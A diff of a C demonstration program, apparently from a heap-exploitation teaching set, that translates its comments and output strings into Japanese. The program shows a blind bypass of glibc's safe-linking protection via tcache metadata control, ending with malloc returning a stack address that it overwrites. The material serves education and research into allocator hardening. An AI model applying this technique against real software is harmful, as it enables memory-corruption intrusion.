@@ -4,128 +4,128 @@
 #include <assert.h>
 
 /* 
- * This method showcases a blind bypass for the safe-linking mitigation introduced in glibc 2.32. 
+ * この手法は、glibc 2.32 で導入された safe-linking 緩和策の blind bypass(ブラインドな回避)を示します。
  * https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41
  * 
- * NOTE: This requires 4 bits of bruteforce if the primitive is a write primitive, as the LSB will  
- * contain 4 bits of randomness. If you can increment integers, no brutefore is required.
+ * 注意: プリミティブが書き込みプリミティブの場合、LSB に 4 ビットのランダム性が含まれるため、
+ * 4 ビットのブルートフォース(bruteforce)が必要です。整数をインクリメントできる場合は、ブルートフォースは不要です。
  *
- * Safe-Linking is a memory protection measure using ASLR randomness to fortify single-linked lists. 
- * It obfuscates pointers and enforces alignment checks, to prevent pointer hijacking in t-cache.
+ * Safe-Linking は、ASLR のランダム性を利用して単方向リストを強化するメモリ保護策です。
+ * t-cache でのポインタの乗っ取りを防ぐために、ポインタを難読化し、アラインメントのチェックを強制します。
  *
- * When an entry is linked in to the t-cache, the address is XOR'd with the address that free is 
- * called on, shifted by 12 bits. However if you were to link this newly protected pointer, it
- * would be XOR'd again with the same key, effectively reverting the protection. 
- * Thus, by simply protecting a pointer twice we effectively achieve the following:
+ * エントリが t-cache にリンクされるとき、そのアドレスは、free が呼び出されたアドレスを
+ * 12 ビット右にシフトした値と XOR されます。しかし、この新たに保護されたポインタを再びリンクすると、
+ * 同じ鍵で再度 XOR されるため、実質的に保護が元に戻ります。
+ * したがって、ポインタを 2 回保護するだけで、実質的に次のことが達成されます:
  *	
  *                                  (ptr^key)^key = ptr
  *
- * The technique requires control over the t-cache metadata, so pairing it with a technique such as
- * house of water might be favourable.
+ * この技法は t-cache のメタデータの制御を必要とするため、
+ * house of water などの技法と組み合わせるのが好ましいかもしれません。
  *
- * Technique by @udp_ctf - Water Paddler / Blue Water 
+ * 技法の作者: @udp_ctf - Water Paddler / Blue Water
  */
 
 int main(void) {
-	// Prevent _IO_FILE from buffering in the heap
+	// _IO_FILE がヒープ内でバッファリングしないようにします
 	setbuf(stdin, NULL);
 	setbuf(stdout, NULL);
 	setbuf(stderr, NULL);
 
-	// Create the goal stack buffer
+	// 目標となるスタックバッファを作成します
 	char goal[] = "Replace me!";
 	puts("============================================================");
-	printf("Our goal is to write to the stack variable @ %p\n", goal);
-	printf("String contains: %s\n", goal);
+	printf("目標は、%p にあるスタック変数に書き込むことです\n", goal);
+	printf("文字列の内容: %s\n", goal);
 	puts("============================================================");
 	puts("\n");
 
-	// force the allocation of tcache_perthread_struct
+	// tcache_perthread_struct の確保を強制します
 	free(malloc(0x60));
 
-	// Step 1: Allocate
-	puts("Allocate two chunks in two different t-caches:");
+	// ステップ 1: 確保
+	puts("2 つの異なる t-cache に 2 つのチャンクを確保します:");
 	
-	// Allocate two chunks of size 0x28 for 0x30 t-cache
-	puts("\t- 0x30 chunks:");
+	// 0x30 の t-cache 用に、サイズ 0x28 のチャンクを 2 つ確保します
+	puts("\t- 0x30 のチャンク:");
 	void *a = malloc(0x28);
 	void *b = malloc(0x28);
-	printf("\t\t* Entry a @ %p\n", a);
-	printf("\t\t* Entry b @ %p\n", b);
+	printf("\t\t* エントリ a @ %p\n", a);
+	printf("\t\t* エントリ b @ %p\n", b);
 
-	// Allocate two chunks of size 0x18 for 0x20 t-cache
+	// 0x20 の t-cache 用に、サイズ 0x18 のチャンクを 2 つ確保します
 	void *c = malloc(0x18);
 	void *d = malloc(0x18);
-	puts("\t- 0x20 chunks:");
-	printf("\t\t* Entry c @ %p\n", c);
-	printf("\t\t* Entry d @ %p\n", d);
+	puts("\t- 0x20 のチャンク:");
+	printf("\t\t* エントリ c @ %p\n", c);
+	printf("\t\t* エントリ d @ %p\n", d);
 	puts("");
 
-	// Step 2: Write an arbitrary value (or note the offset to an exsisting value)
-	puts("Allocate a pointer which will contain a pointer to the stack variable:");
+	// ステップ 2: 任意の値を書き込みます(または既存の値へのオフセットを控えます)
+	puts("スタック変数へのポインタを格納するポインタを確保します:");
 
-	// Allocate a chunk and store a modified pointer to the 'goal' array.
+	// チャンクを確保し、'goal' 配列への加工したポインタを格納します。
 	void *value = malloc(0x28);
-	// make sure that the pointer ends on 0 for proper heap alignemnt or a fault will occur
+	// ヒープのアラインメントを正しくするため、ポインタが 0 で終わるようにします。そうしないとフォルトが発生します
 	*(long *)value = ((long)(goal) & ~(0xf));
 
-	printf("\t* Arbitrary value (0x%lx) written to %p\n", *(long*)value, value);
+	printf("\t* 任意の値 (0x%lx) を %p に書き込みました\n", *(long*)value, value);
 	puts("");
 
-	// Step 3: Free the two chunks in the two t-caches to make two t-cache entries in two different caches
-	puts("Free the 0x30 and 0x20 chunks to populate the t-caches");
+	// ステップ 3: 2 つの t-cache の 2 つのチャンクを解放して、2 つの異なるキャッシュに 2 つの t-cache エントリを作ります
+	puts("0x30 と 0x20 のチャンクを解放して、t-cache を埋めます");
 
-	puts("\t- Free 0x30 chunks:");
-	// Free the allocated 0x28 chunks to populate the 0x30 t-cache
+	puts("\t- 0x30 のチャンクを解放:");
+	// 確保した 0x28 のチャンクを解放して、0x30 の t-cache を埋めます
 	free(a);
 	free(b);
-	printf("\t\t> 0x30 t-cache: [%p -> %p]\n", b, a);
+	printf("\t\t> 0x30 の t-cache: [%p -> %p]\n", b, a);
 
-	puts("\t- Free the 0x20 chunks");
-	// Free the allocated 0x18 chunks to populate the 0x20 t-cache
+	puts("\t- 0x20 のチャンクを解放");
+	// 確保した 0x18 のチャンクを解放して、0x20 の t-cache を埋めます
 	free(c);
 	free(d);
-	printf("\t\t> 0x20 t-cache: [%p -> %p]\n", d, c);
+	printf("\t\t> 0x20 の t-cache: [%p -> %p]\n", d, c);
 	puts("");
 
-	// Step 4: Using our t-cache metadata control primitive, we will now execute the vulnerability
-	puts("Modify the 0x30 t-cache pointer to point to the heap value that holds our arbitrary value, ");
-	puts("by overwriting the LSB of the pointer for 0x30 in the t-cache metadata:");
+	// ステップ 4: t-cache のメタデータを制御するプリミティブを使って、脆弱性を実行します
+	puts("0x30 の t-cache ポインタを、任意の値を保持するヒープ上の値を指すように変更します。");
+	puts("t-cache のメタデータ内の 0x30 用ポインタの LSB を上書きします:");
 	
-	// Calculate the address of the t-cache metadata
+	// t-cache のメタデータのアドレスを計算します
 	void *metadata = (void *)((long)(value) & ~(0xfff)) + 0x70;
 
-	// Overwrite the LSB of the 0x30 t-cache chunk to point to the heap chunk containing the arbitrary value
+	// 0x30 の t-cache チャンクの LSB を上書きして、任意の値を含むヒープチャンクを指すようにします
 	*(unsigned int*)(metadata+0xb0) = (((long)metadata >> 12) << 12)+((long)(value) & (0xfff));
 
-	printf("\t\t> 0x40 t-cache: [%p -> 0x%lx]\n", value, (*(long*)value)^((long)metadata>>12));
+	printf("\t\t> 0x40 の t-cache: [%p -> 0x%lx]\n", value, (*(long*)value)^((long)metadata>>12));
 	puts("");
 
-	puts("Allocate once to make the protected pointer the current entry in the 0x40 bin:");
+	puts("1 回確保して、保護されたポインタを 0x40 の bin の現在のエントリにします:");
 	void *_ = malloc(0x28);
-	printf("\t\t> 0x30 t-cache: [0x%lx]\n", *(unsigned long*)(metadata+0xb0));
+	printf("\t\t> 0x30 の t-cache: [0x%lx]\n", *(unsigned long*)(metadata+0xb0));
 	puts("");
 
 	/* VULNERABILITY */	
-	puts("Point the 0x20 bin to the 0x40 bin in the t-cache metadata, containing the newly safe-linked value:");
+	puts("t-cache のメタデータ内で、0x20 の bin を、新たに safe-link された値を含む 0x40 の bin に向けます:");
 	*(unsigned int*)(metadata+0xa8) = (long)(metadata)+0xb0;
-	printf("\t\t> 0x20 t-cache: [0x%lx -> 0x%lx]\n", (long)(metadata)+0xb0, *(long*)value);
+	printf("\t\t> 0x20 の t-cache: [0x%lx -> 0x%lx]\n", (long)(metadata)+0xb0, *(long*)value);
 	puts("");
 	/* VULNERABILITY */	
 
-	// Step 5: Allocate twice to allocate the arbitrary value
-	puts("Allocate twice to gain a pointer to our arbitrary value");
+	// ステップ 5: 2 回確保して、任意の値を確保します
+	puts("2 回確保して、任意の値へのポインタを得ます");
 	
 	_ = malloc(0x18);
-	printf("\t\t> First  0x20 allocation: %p\n", _);
+	printf("\t\t> 1 回目の 0x20 の確保: %p\n", _);
 	
 	char *vuln = malloc(0x18);
-	printf("\t\t> Second 0x20 allocation: %p\n", vuln);
+	printf("\t\t> 2 回目の 0x20 の確保: %p\n", vuln);
 	puts("");
 
-	// Step 6: Overwrite the goal string pointer and verify it has been changed
+	// ステップ 6: 目標の文字列ポインタを上書きし、変更されたことを確認します
 	strcpy(vuln, "XXXXXXXXXXX HIJACKED!");
 
-	printf("String now contains: %s\n", goal);	
+	printf("文字列の現在の内容: %s\n", goal);	
 	assert(strcmp(goal, "Replace me!") != 0);
 }
